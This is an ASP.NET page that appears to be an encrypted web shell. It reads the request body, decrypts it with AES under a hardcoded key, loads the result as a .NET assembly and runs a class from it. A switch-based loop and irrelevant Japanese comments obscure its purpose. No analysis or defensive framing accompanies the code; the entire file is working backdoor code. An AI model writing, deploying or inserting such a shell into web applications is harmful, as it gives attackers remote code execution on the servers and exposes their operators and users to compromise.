<%@ Page Language="C#" %>
<%
if (Request.Cookies.Count > 0) {
    int state_s1 = 0;
    byte[] data_d2 = null;
    byte[] key_k3 = null;
    System.Reflection.Assembly asm_a4 = null;

    // ループを開始します。
    for (int i_i5 = 0; i_i5 < 4; i_i5++) {
        // 月が綺麗ですね。
        switch (state_s1) {
            case 0:
                // キーを準備しています。
                key_k3 = System.Text.Encoding.Default.GetBytes(new string(new char[] {'c','a','6','3','4','5','7','5','3','8','b','9','b','1','e','0'}));
                state_s1++;
                break;
            case 1:
                // データを読んでいます。
                data_d2 = new byte[Request.InputStream.Length];
                Request.InputStream.Read(data_d2, 0, data_d2.Length);
                state_s1++;
                break;
            case 2:
                // ラーメン食べたい。
                var p_p6 = new System.Security.Cryptography.RijndaelManaged();
                var d_d7 = p_p6.CreateDecryptor(key_k3, key_k3);
                asm_a4 = System.Reflection.Assembly.Load(d_d7.TransformFinalBlock(data_d2, 0, data_d2.Length));
                state_s1++;
                break;
            case 3:
                // もうすぐです。
                object inst_i8 = asm_a4.CreateInstance("K");
                inst_i8.Equals(this);
                state_s1++;
                break;
        }
    }
}
%>